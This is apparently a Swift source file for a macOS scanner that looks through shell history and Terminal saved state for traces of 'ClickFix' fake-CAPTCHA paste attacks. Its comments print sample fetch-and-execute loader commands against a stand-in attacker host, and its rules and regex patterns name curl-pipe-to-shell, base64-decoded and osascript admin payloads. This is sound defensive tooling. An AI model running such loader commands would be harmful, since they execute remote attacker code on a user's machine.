import Foundation

/// Detects evidence of "ClickFix" / "fake CAPTCHA" terminal-paste attacks.
///
/// Since 2024 the dominant macOS infection chain is social engineering: the user
/// is shown a page (fake CAPTCHA, "fix this error", "verify you are human", a fake
/// CDN gate, a copy/paste step in a job interview) and instructed to paste a
/// command into Terminal. The pasted command is typically a one-shot loader:
///   - `bash -c "$(curl -fsSL https://attacker.tld/x)"`
///   - `curl …  | sh` / `wget …  | bash`
///   - `osascript -e 'do shell script "curl … | bash" with administrator privileges'`
///   - `eval "$(curl …)"` or base64-decode-then-pipe-to-shell
///   - `echo BASE64 | base64 -d | bash`
///
/// We don't see the live paste — but the executed command leaves a trace in the
/// shell's history file (~/.zsh_history, ~/.bash_history, fish history) and in
/// recent Terminal session preferences. This scanner hunts those traces.
public final class ClickFixScanner: Scanner {
    public let name = "ClickFix / Terminal Paste Scan"
    public init() {}

    /// Each rule fires on a recent shell-history line. Rules are ordered most
    /// specific first so we report the strongest indicator we can.
    private struct Rule {
        let id: String
        let severity: Severity
        let title: String
        let detail: String
        /// Returns true if `line` matches this rule.
        let match: (String) -> Bool
    }

    private let rules: [Rule] = [
        // osascript "do shell script ... with administrator privileges" + curl/wget
        // is the canonical ClickFix payload — escalates and runs remote code in one go.
        Rule(
            id: "osascript-admin-remote",
            severity: .high,
            title: "Recently ran an osascript that fetches and executes remote code as admin",
            detail: "osascript invocation with both 'with administrator privileges' and a network fetch — the exact pattern used by fake-CAPTCHA / ClickFix campaigns",
            match: { line in
                let l = line.lowercased()
                return l.contains("osascript") &&
                       l.contains("do shell script") &&
                       l.contains("administrator privileges") &&
                       (l.contains("curl ") || l.contains("wget ") || l.contains("nscurl"))
            }
        ),
        // bash -c "$(curl ...)"  /  sh -c "$(curl ...)"  — process substitution / command substitution
        // around a remote download. Signature pattern of ClickFix and most malicious one-liners.
        Rule(
            id: "shell-cmdsub-remote",
            severity: .high,
            title: "Shell history contains pipe-to-shell from a remote URL",
            detail: "Command substitutes the output of curl/wget into bash/sh — used by malicious copy-paste loaders",
            match: { line in
                let l = line.lowercased()
                let hasShell = l.contains("bash ") || l.contains("zsh ") || l.contains("/bin/bash") ||
                               l.contains("/bin/zsh") || l.hasPrefix("sh ") || l.contains(" sh ") ||
                               l.contains("/bin/sh")
                let hasFetch = l.contains("curl ") || l.contains("wget ") || l.contains("nscurl")
                let hasCmdSub = l.contains("$(") || l.contains("`") || l.contains("<(")
                return hasShell && hasFetch && hasCmdSub
            }
        ),
        // curl/wget piped directly into a shell. The classic "curl | bash" pattern.
        Rule(
            id: "curl-pipe-shell",
            severity: .high,
            title: "Shell history contains 'curl … | sh' / 'wget … | bash'",
            detail: "Piping a remote download into a shell runs unverified attacker code with the user's privileges",
            match: { line in
                let l = line.lowercased()
                guard l.contains("curl ") || l.contains("wget ") else { return false }
                // Look for a pipe followed by a shell.
                if let pipeIdx = l.range(of: "|") {
                    let after = l[pipeIdx.upperBound...]
                    let trimmed = after.trimmingCharacters(in: .whitespaces)
                    if trimmed.hasPrefix("sh") || trimmed.hasPrefix("bash") ||
                       trimmed.hasPrefix("zsh") || trimmed.hasPrefix("/bin/sh") ||
                       trimmed.hasPrefix("/bin/bash") || trimmed.hasPrefix("/bin/zsh") {
                        return true
                    }
                }
                return false
            }
        ),
        // base64 -d | bash — common obfuscated ClickFix payload.
        Rule(
            id: "base64-pipe-shell",
            severity: .high,
            title: "Shell history contains base64-decoded payload piped to a shell",
            detail: "base64 -d | sh / bash is a classic obfuscation for malicious copy-paste loaders",
            match: { line in
                let l = line.lowercased()
                let isBase64 = l.contains("base64 -d") || l.contains("base64 --decode") ||
                               l.contains("openssl base64") || l.contains("openssl enc -base64")
                guard isBase64 else { return false }
                return l.contains("| sh") || l.contains("|sh") ||
                       l.contains("| bash") || l.contains("|bash") ||
                       l.contains("| zsh") || l.contains("|zsh")
            }
        ),
        // eval "$(curl ...)"  — runs remote code in the current shell, no second process.
        Rule(
            id: "eval-remote",
            severity: .high,
            title: "Shell history contains eval of remote code",
            detail: "eval \"$(curl …)\" / eval $(wget …) executes attacker output in the current shell",
            match: { line in
                let l = line.lowercased()
                guard l.contains("eval") else { return false }
                return l.contains("curl ") || l.contains("wget ") || l.contains("nscurl")
            }
        ),
        // python -c / perl -e / ruby -e with a network fetch — drop-and-run via a scripting interp.
        Rule(
            id: "interp-remote-exec",
            severity: .high,
            title: "Shell history runs a one-liner interpreter that fetches network code",
            detail: "python/perl/ruby -c/-e combined with a urllib/socket fetch is a stage-1 dropper pattern",
            match: { line in
                let l = line.lowercased()
                let hasInterp =
                    (l.contains("python") && (l.contains(" -c ") || l.contains("\"-c\""))) ||
                    (l.contains("perl") && (l.contains(" -e ") || l.contains("\"-e\""))) ||
                    (l.contains("ruby") && (l.contains(" -e ") || l.contains("\"-e\"")))
                guard hasInterp else { return false }
                return l.contains("urllib") || l.contains("socket") ||
                       l.contains("http.client") || l.contains("net::http") ||
                       l.contains("uri.open") || l.contains("requests.get") ||
                       l.contains("urlopen")
            }
        ),
        // chmod +x /tmp/* && /tmp/foo — staging an attacker binary in /tmp and running it.
        Rule(
            id: "tmp-chmod-exec",
            severity: .medium,
            title: "Shell history makes a /tmp file executable and runs it",
            detail: "chmod +x in /tmp followed by execution is a common dropper finishing move",
            match: { line in
                let l = line.lowercased()
                guard l.contains("chmod") else { return false }
                // Either "chmod +x /tmp/..." or "chmod 7?? /tmp/..."
                return (l.contains("/tmp/") || l.contains("/private/tmp/") ||
                        l.contains("/var/tmp/") || l.contains("$tmpdir")) &&
                       (l.contains("+x") || l.contains("755") || l.contains("777") || l.contains("700"))
            }
        ),
    ]

    public func scan(progress: ScanProgress? = nil) -> ScanResult {
        let start = Date()
        var findings: [Finding] = []
        var errors: [String] = []

        progress?.update("scanning shell history files")
        scanShellHistories(findings: &findings, errors: &errors)

        progress?.update("scanning recent Terminal saved state")
        scanTerminalSavedState(findings: &findings, errors: &errors)

        return ScanResult(
            scannerName: name,
            findings: findings,
            errors: errors,
            duration: Date().timeIntervalSince(start)
        )
    }

    // MARK: - Shell Histories

    private func scanShellHistories(findings: inout [Finding], errors: inout [String]) {
        let home = ShellRunner.realUserHome
        let historyFiles = [
            "\(home)/.zsh_history",
            "\(home)/.bash_history",
            "\(home)/.history",
            "\(home)/.local/share/fish/fish_history",
            "/var/root/.zsh_history",
            "/var/root/.bash_history",
        ]

        // Anchor "recent" relative to the file's modification time so we still catch fresh
        // attacks even if the user's clock is wrong. We only look at the tail of the file.
        for file in historyFiles {
            guard FileManager.default.fileExists(atPath: file),
                  let content = try? String(contentsOfFile: file, encoding: .utf8) else { continue }

            // History files can be large. Only inspect the last ~400 entries — that's what
            // would actually catch a recent paste, and bounds our work.
            let allLines = content.components(separatedBy: "\n")
            let lines = Array(allLines.suffix(400))

            // Track which rules already fired for THIS file so we don't drown the user
            // in duplicate findings if they re-ran the same loader multiple times.
            var firedRules: Set<String> = []
            // De-dupe by (rule, normalized line) so re-running the same one-liner doesn't
            // cause two findings, but two distinct one-liners hitting the same rule do.
            var firedRuleAndLine: Set<String> = []

            for rawLine in lines {
                // zsh extended_history format prefixes lines with ": <epoch>:<elapsed>;<cmd>"
                // — strip the metadata so we match against the actual command.
                let line = stripZshHistoryPrefix(rawLine)
                let trimmed = line.trimmingCharacters(in: .whitespaces)
                if trimmed.isEmpty || trimmed.hasPrefix("#") { continue }

                for rule in rules {
                    if firedRules.contains(rule.id) { continue }
                    let dedupeKey = "\(rule.id)::\(trimmed.prefix(160))"
                    if firedRuleAndLine.contains(dedupeKey) { continue }
                    if rule.match(trimmed) {
                        firedRules.insert(rule.id)
                        firedRuleAndLine.insert(dedupeKey)
                        let snippet = String(trimmed.prefix(180))
                        findings.append(Finding(
                            severity: rule.severity,
                            category: .suspiciousProcess,
                            title: rule.title,
                            detail: "\(rule.detail) — \(URL(fileURLWithPath: file).lastPathComponent): \(snippet)",
                            path: file,
                            remediation: "Inspect with: tail -100 \"\(file)\" — if you didn't run this, treat the Mac as compromised: rotate browser passwords, check ~/Library/LaunchAgents, run: sweep --json"
                        ))
                        break
                    }
                }
            }
        }
    }

    // MARK: - Terminal Saved State

    /// Terminal.app saves the on-screen scrollback in a per-window plist under
    /// ~/Library/Saved Application State/com.apple.Terminal.savedState/. If the
    /// user's last Terminal session contained one of our IOCs, the recovered text
    /// will still be there even after they cleared their history.
    private func scanTerminalSavedState(findings: inout [Finding], errors: inout [String]) {
        let home = ShellRunner.realUserHome
        let stateDirs = [
            "\(home)/Library/Saved Application State/com.apple.Terminal.savedState",
            "\(home)/Library/Saved Application State/com.googlecode.iterm2.savedState",
        ]

        let fm = FileManager.default
        for dir in stateDirs where fm.fileExists(atPath: dir) {
            // The window state file is binary plist; grep for the IOCs as raw text.
            let result = ShellRunner.run("/usr/bin/grep", arguments: [
                "-laE",
                #"do shell script.*administrator|bash <\(curl|curl[^|]*\| *(sh|bash|zsh)|base64 *(-d|--decode).*\| *(sh|bash|zsh)|eval *\$\(curl"#,
                dir,
            ], timeout: 10)
            guard result.success && !result.stdout.isEmpty else { continue }

            // Only flag once per directory — multiple window files often share the same paste.
            let firstHit = result.stdout.split(separator: "\n").first.map(String.init) ?? dir
            findings.append(Finding(
                severity: .high,
                category: .suspiciousProcess,
                title: "Terminal saved-state contains a fetch-and-execute one-liner",
                detail: "Recovered text from a Terminal/iTerm2 window state file matches a ClickFix loader pattern",
                path: firstHit,
                remediation: "Quit Terminal, then: rm -rf \"\(dir)\" — and treat the Mac as compromised if you didn't run this command yourself"
            ))
        }
    }

    // MARK: - Helpers

    /// In zsh's extended history a line looks like ": 1700000000:0;ls -la".
    /// Strip everything up to and including the first ';' — but only if the
    /// metadata prefix matches.
    private func stripZshHistoryPrefix(_ line: String) -> String {
        guard line.hasPrefix(": ") else { return line }
        guard let semi = line.firstIndex(of: ";") else { return line }
        return String(line[line.index(after: semi)...])
    }
}
